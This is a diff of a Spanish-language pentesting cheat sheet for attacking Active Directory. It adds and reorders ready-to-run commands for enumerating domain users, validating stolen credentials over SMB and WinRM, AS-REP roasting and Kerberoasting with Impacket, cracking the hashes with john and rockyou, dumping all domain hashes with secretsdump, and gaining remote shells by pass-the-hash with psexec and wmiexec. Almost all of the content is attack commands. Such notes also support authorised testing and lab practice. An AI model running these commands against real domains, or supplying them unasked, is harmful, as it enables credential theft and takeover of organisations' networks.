@@ -12,14 +12,65 @@ python3 kerbrute.py -users users.txt -passwords pass.txt -domain dominio.local -
 ```
 El parámetro **-t 100** : sirve para indicar los hilos
 
-### Acceso al dominio con un hash (ataque pass the hash)
+#### Impacket
+Con impacket, se puede tratar de enumerar los usuarios en un DC. (guest no se cambia, siempre se utiliza "guest")
+```bash
+impacket-lookupsid guest@<ip> -no-pass
+```
+
+### Validar credenciales de dominio
+
+```bash
+crackmapexec smb <ip> -u <usuario> -p <contraseña>
+```
+
+### Validar winrm
+
+Quizas tengamos opción de lanzar una consola remota, para comprobarlo:
+```bash
+crackmapexec winrm <ip> -u <usuario> -p <contraseña>
+```
+
+
+### Obtener hash usuario con NOT-PREAUTH
+Cuando detectamos usuarios en un dominio que tienen el NOT-PREAUTH, podemos intentar obtener el hash de su contraseña para luego crackearla con john the ripper.
+
+```bash
+#opcion1
+impacket-GetNPUsers <dominio>/<usuario> -no-pass
+
+#opcion2
+impacket-GetNPUsers <dominio>/ -no-pass -usersfile usuarios.txt
+```
+```bash
+#Con el hash obtenido, lo pasamos por john
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+### Obtener hashes vulnerables (Ataque TGT)
+
+si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.
+```bash
+#opcion1
+impacket-secretsdump -just-dc usuario@ip (SAM HASH, para pass-the-hash)
+
+#opcion2
+impacket-GetUserSPNs dominio/usuario:contraseña -request (para john)
+
+```
+
+### Conexion por consola con hash (ataque pass the hash)
 
 Poemos intentar acceder al dominio sin necesidad de crackear la contraseña, solamente teniendo el hash, haciendo un **pass the hash**
 
 #### Ataque pass the hash con impacket
 
 ```bash
+#opcion 1
 impacket-psexec usuario@ip -hashes <hash en cadena de texto>
+
+#opcion 2
+impacket-wmiexec <dominio>/user@ip -hashes <hash en cadena de texto>
 ```
 
 Ejemplo:
@@ -28,28 +79,3 @@ Ejemplo:
 impacket-psexec Administrator@10.10.10.4 -hashes aaeeff31234aaaadddsfee345:2345:addfbbe
 ```
 
-
-### Validar credenciales de dominio
-
-```bash
-crackmapexec smb <ip> -u <usuario> -p <contraseña>
-```
-
-### Obtener hash contraseña usuario dominio
-Cuando detectamos usuarios en un dominio que tienen el NOT-PREAUTH, podemos intentar obtener el hash de su contraseña para luego crackearla con john the ripper.
-
-```bash
-impacket-GetNPUsers <dominio>/<usuario> -no-pass
-```
-```bash
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-### Obtener hashes vulnerables 
-
-si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.
-```bash
-impacket-secretsdump -just-dc usuario@ip
-```
-
-posteriormente nos pide la contraseña de ese usuario, y lo ejecutamos. Nos obtiene los hashes de todos los usuarios del dominio.
